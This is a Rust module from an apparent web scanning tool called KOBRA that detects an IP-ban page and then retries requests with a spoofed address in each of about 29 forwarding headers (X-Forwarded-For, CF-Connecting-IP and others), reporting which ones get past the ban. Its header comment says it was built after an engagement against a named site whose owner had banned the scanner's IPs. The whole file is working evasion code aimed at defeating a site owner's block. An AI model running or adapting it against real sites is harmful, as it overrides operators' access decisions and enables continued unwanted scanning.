//! IP Ban Bypass Module — KOBRA enhanced 2026-07-27
//!
//! Inspired by sankavollerei.web.id engagement: owner permanently bans
//! scanner IPs but backend reads IP from MANY header variations.

use crate::types::{Finding, Severity};
use crate::http::HttpClient;
use std::collections::HashMap;

const IP_SPOOF_HEADERS: &[&str] = &[
    "X-Forwarded-For",
    "X-Real-IP",
    "True-Client-IP",
    "CF-Connecting-IP",
    "X-Original-IP",
    "X-Client-IP",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-ProxyUser-Ip",
    "Client-IP",
    "Forwarded",
    "X-Original-Forwarded-For",  // Additional variants discovered in recon
    "X-Real-Ip",
    "X-ProxyUser-IP",
    "CF-Connecting-Ip",
    "X-Originating-IP",
    "Forwarded-For",
    "X-Forwarded",
    "Via",
    "X-Forwarded-Proto",
    "X-Forwarded-Host",
    "X-Forwarded-Port",
    "X-Host",
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Custom-IP-Authorization",
    "X-Original-Remote-Addr",
    "X-Remote-Address",
];

pub async fn scan(http: &HttpClient, target: &str, _mode: crate::types::Mode) -> Vec<Finding> {
    let mut findings = Vec::new();
    let url = if target.ends_with('/') {
        target.to_string()
    } else {
        format!("{}/", target)
    };

    // 1) Baseline
    let baseline = http.get(&url).await;
    let (baseline_status, baseline_body) = match baseline {
        Ok((s, _h, b, _u)) => (s, b),
        Err(_) => return findings,
    };

    // Detect ban indicators
    let lower = baseline_body.to_lowercase();
    let banned = baseline_status == 403 && (
        lower.contains("banned") ||
        lower.contains("permanently") ||
        lower.contains("fck u") ||
        lower.contains("spammer") ||
        lower.contains("suspicious activity") ||
        lower.contains("your ip address")
    );

    if !banned {
        return findings;
    }

    // 2) Try spoofing each IP header
    let mut bypassed_headers = Vec::new();
    for header in IP_SPOOF_HEADERS.iter() {
        let mut extra = HashMap::new();
        extra.insert(header.to_string(), "1.1.1.1".to_string());

        let resp = http.fetch(&url, reqwest::Method::GET, None, Some(extra)).await;
        if let Ok((status, _h, body, _u)) = resp {
            if status != baseline_status && status < 400 {
                bypassed_headers.push((header.to_string(), status, body));
            }
        }
    }

    if !bypassed_headers.is_empty() {
        let snippet: String = bypassed_headers[0].2.chars().take(150).collect();
        let header_list: Vec<&str> = bypassed_headers.iter().map(|(h, _, _)| h.as_str()).collect();
        let mut finding = Finding::new(
            Severity::High,
            "ip_ban_bypass",
            &format!(
                "IP ban bypassable via {} header(s) ({} confirmed)",
                bypassed_headers.len(),
                bypassed_headers.len()
            ),
            target,
        )
        .with_payload(&format!("Headers: {}", header_list.join(", ")))
        .with_evidence(&format!(
            "Baseline (no spoof): {} (banned). {} bypass headers found that return 200. First body: {}",
            baseline_status, bypassed_headers.len(), snippet
        ))
        .with_note(&format!(
            "Backend trusts {} client-supplied header(s) without proxy verification. Attacker can rotate IPs at will. Headers bypassed: {}",
            bypassed_headers.len(),
            header_list.join(", ")
        ));
        finding = finding.with_response(&url);
        findings.push(finding);
    }

    findings
}
